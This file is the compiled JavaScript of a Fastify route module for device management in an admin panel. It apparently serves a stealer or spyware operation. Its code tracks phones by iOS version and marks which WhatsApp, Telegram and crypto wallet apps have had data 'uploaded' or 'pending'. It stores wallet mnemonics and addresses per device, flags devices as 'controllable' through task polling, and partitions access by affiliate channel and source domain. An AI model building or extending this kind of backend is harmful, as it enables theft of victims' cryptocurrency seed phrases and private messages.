import { Device, DeviceEvent, Mnemonic, WalletData, WhatsAppData, TelegramData, DerivedAddress } from '../../../core/db/models/index.js';
import { DEFAULTS, TRACKED_BUNDLE_IDS, WALLET_TYPE_TO_BUNDLE_ID } from '../../../config/constants.js';
import { recomputeDeviceCounts } from '../../../core/devices/counts.js';
import { backfillBusinessSourceDomains, backfillMissingDeviceSourceDomains } from '../../../core/devices/source-domain.js';
import { backfillWalletCount } from '../../../core/devices/wallet.js';
import { backfillWalletStats } from '../../../core/channel-stats/backfill-wallet-stats.js';
import { isAdminLike } from '../../../core/auth/permissions.js';
function canSeeSocial(request, type) {
    if (!request.user || isAdminLike(request.user.role))
        return true;
    return (request.visibleSocialTypes || []).includes(type);
}
function applyDeviceSocialVisibility(row, request) {
    const data = typeof row?.toObject === 'function' ? row.toObject() : { ...row };
    if (canSeeSocial(request, 'whatsapp') && canSeeSocial(request, 'telegram'))
        return data;
    if (!canSeeSocial(request, 'whatsapp'))
        delete data.wsCount;
    if (!canSeeSocial(request, 'telegram'))
        delete data.tgCount;
    return data;
}
export async function devicesRoute(fastify) {
    const adminOnly = async (request, reply) => {
        if (!isAdminLike(request.user?.role)) {
            reply.code(403);
            return reply.send({ error: 'Admin only' });
        }
    };
    fastify.post('/api/devices/recompute-counts', { preHandler: adminOnly }, async () => {
        const result = await recomputeDeviceCounts();
        return { success: true, ...result };
    });
    fastify.post('/api/devices/backfill-source-domains', { preHandler: adminOnly }, async () => {
        const result = await backfillBusinessSourceDomains();
        return { success: true, ...result };
    });
    fastify.post('/api/devices/backfill-device-source-domains', { preHandler: adminOnly }, async () => {
        const result = await backfillMissingDeviceSourceDomains();
        return { success: true, ...result };
    });
    fastify.post('/api/devices/backfill-wallet-count', { preHandler: adminOnly }, async () => {
        const result = await backfillWalletCount();
        return { success: true, ...result };
    });
    fastify.post('/api/devices/backfill-wallet-stats', { preHandler: adminOnly }, async () => {
        const result = await backfillWalletStats();
        return { success: true, ...result };
    });
    fastify.post('/api/devices/backfill-app-data-status', { preHandler: adminOnly }, async () => {
        const BATCH_SIZE = 500;
        // 1. 聚合 Mnemonic: deviceId → Set<walletType>
        const mnemonicAgg = await Mnemonic.aggregate([
            { $group: { _id: '$deviceId', walletTypes: { $addToSet: '$walletType' } } },
        ]);
        const mnemonicMap = new Map(mnemonicAgg.map((r) => [r._id, r.walletTypes]));
        // 2. 聚合 WhatsAppData: deviceId set
        const wsAgg = await WhatsAppData.aggregate([
            { $group: { _id: '$deviceId' } },
        ]);
        const wsDeviceIds = new Set(wsAgg.map((r) => r._id));
        // 3. 聚合 TelegramData: deviceId set
        const tgAgg = await TelegramData.aggregate([
            { $group: { _id: '$deviceId' } },
        ]);
        const tgDeviceIds = new Set(tgAgg.map((r) => r._id));
        let devicesUpdated = 0;
        const cursor = Device.find({}).select('uniqueId installedApps').lean().cursor();
        let batch = [];
        for await (const device of cursor) {
            const installed = new Set(device.installedApps || []);
            const trackedInstalled = TRACKED_BUNDLE_IDS.filter(b => installed.has(b));
            const uploaded = new Set();
            if (wsDeviceIds.has(device.uniqueId))
                uploaded.add('net.whatsapp.WhatsApp');
            if (tgDeviceIds.has(device.uniqueId))
                uploaded.add('ph.telegra.Telegraph');
            const deviceWalletTypes = mnemonicMap.get(device.uniqueId) || [];
            for (const wt of deviceWalletTypes) {
                const bid = WALLET_TYPE_TO_BUNDLE_ID[wt];
                if (bid && trackedInstalled.includes(bid))
                    uploaded.add(bid);
            }
            const pending = trackedInstalled.filter(b => !uploaded.has(b));
            batch.push({
                updateOne: {
                    filter: { uniqueId: device.uniqueId },
                    update: { $set: { pendingDataApps: pending, uploadedDataApps: [...uploaded] } },
                },
            });
            if (batch.length >= BATCH_SIZE) {
                await Device.bulkWrite(batch);
                devicesUpdated += batch.length;
                batch = [];
            }
        }
        if (batch.length > 0) {
            await Device.bulkWrite(batch);
            devicesUpdated += batch.length;
        }
        return { devicesUpdated };
    });
    fastify.get('/api/devices', async (request) => {
        const { channelCode, uniqueId, status, sourceDomain, hasWallet, walletAddress, firstSeenStart, firstSeenEnd, lastSeenStart, lastSeenEnd, controllable, lastTaskPollStart, lastTaskPollEnd, app, dataStatus, page = '1', pageSize = '10' } = request.query;
        const filter = { ...request.channelFilter };
        if (isAdminLike(request.user?.role) && channelCode)
            filter.channelCode = channelCode;
        if (uniqueId)
            filter.uniqueId = uniqueId;
        if (sourceDomain)
            filter.sourceDomain = sourceDomain;
        if (hasWallet === 'true')
            filter.walletCount = { $gt: 0 };
        else if (hasWallet === 'false')
            filter.walletCount = 0;
        if (walletAddress) {
            const esc = String(walletAddress).replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
            const addrRegex = { $regex: new RegExp('^' + esc + '$', 'i') };
            // 从 WalletData 和 DerivedAddress 两个来源查 deviceId
            const [wdDevices, daDevices] = await Promise.all([
                WalletData.find({ 'data.address': addrRegex }).distinct('deviceId'),
                DerivedAddress.find({ address: addrRegex }).distinct('deviceId'),
            ]);
            const allDevices = [...new Set([...wdDevices, ...daDevices])];
            filter.uniqueId = filter.uniqueId
                ? { $in: [filter.uniqueId].filter(id => allDevices.includes(id)) }
                : { $in: allDevices };
            if (!filter.uniqueId.$in || filter.uniqueId.$in.length === 0)
                filter.uniqueId = { $in: ['__none__'] };
        }
        if (firstSeenStart || firstSeenEnd) {
            filter.firstSeen = {};
            if (firstSeenStart)
                filter.firstSeen.$gte = new Date(firstSeenStart);
            if (firstSeenEnd)
                filter.firstSeen.$lte = new Date(firstSeenEnd);
        }
        const lastSeenFilter = {};
        if (lastSeenStart)
            lastSeenFilter.$gte = new Date(lastSeenStart);
        if (lastSeenEnd)
            lastSeenFilter.$lte = new Date(lastSeenEnd);
        if (status === 'online') {
            const onlineThreshold = new Date(Date.now() - DEFAULTS.ONLINE_THRESHOLD_MS);
            if (!lastSeenFilter.$gte || lastSeenFilter.$gte < onlineThreshold)
                lastSeenFilter.$gte = onlineThreshold;
        }
        if (Object.keys(lastSeenFilter).length > 0)
            filter.lastSeen = lastSeenFilter;
        // 可控状态 + lastTaskPoll 时间范围筛选（合并为 $gte + $lt 交集）
        let taskPollGte = null;
        let taskPollLt = null;
        const taskThreshold = new Date(Date.now() - DEFAULTS.TASK_TIMEOUT_THRESHOLD_MS);
        if (controllable === 'online')
            taskPollGte = taskThreshold;
        else if (controllable === 'offline')
            taskPollLt = taskThreshold;
        if (lastTaskPollStart) {
            const start = new Date(lastTaskPollStart);
            taskPollGte = taskPollGte ? new Date(Math.max(taskPollGte.getTime(), start.getTime())) : start;
        }
        if (lastTaskPollEnd) {
            const end = new Date(lastTaskPollEnd);
            taskPollLt = taskPollLt ? new Date(Math.min(taskPollLt.getTime(), end.getTime())) : end;
        }
        if (taskPollGte || taskPollLt) {
            filter.lastTaskPoll = {};
            if (taskPollGte)
                filter.lastTaskPoll.$gte = taskPollGte;
            if (taskPollLt)
                filter.lastTaskPoll.$lt = taskPollLt;
        }
        if (app && dataStatus === 'pending') {
            filter.pendingDataApps = app;
        }
        else if (app && dataStatus === 'uploaded') {
            filter.uploadedDataApps = app;
        }
        else if (app && !dataStatus) {
            filter.$or = [{ pendingDataApps: app }, { uploadedDataApps: app }];
        }
        const skip = ((parseInt(page, 10) || 1) - 1) * (parseInt(pageSize, 10) || 10);
        const [data, total] = await Promise.all([
            Device.find(filter).sort({ firstSeen: -1 }).skip(skip).limit(parseInt(pageSize, 10) || 10),
            Device.countDocuments(filter),
        ]);
        return { data: data.map(row => applyDeviceSocialVisibility(row, request)), total, page: parseInt(page, 10) || 1, pageSize: parseInt(pageSize, 10) || 10 };
    });
    fastify.get('/api/devices/:uniqueId', async (request, reply) => {
        const { uniqueId } = request.params;
        const device = await Device.findOne({ uniqueId, ...request.channelFilter });
        if (!device) {
            reply.code(404);
            return { error: 'Not found' };
        }
        const events = await DeviceEvent.find({ uniqueId }).sort({ createdAt: -1 }).limit(50);
        const data = applyDeviceSocialVisibility(device, request);
        return { data: { ...data, events } };
    });
    fastify.post('/api/devices/batch-info', async (request) => {
        const { uniqueIds } = request.body;
        if (!Array.isArray(uniqueIds) || uniqueIds.length === 0)
            return { data: [] };
        const ids = uniqueIds.slice(0, 100);
        const devices = await Device.find({ uniqueId: { $in: ids }, ...request.channelFilter }).select('uniqueId iosVersion productType').lean();
        return { data: devices };
    });
}
//# sourceMappingURL=devices.js.map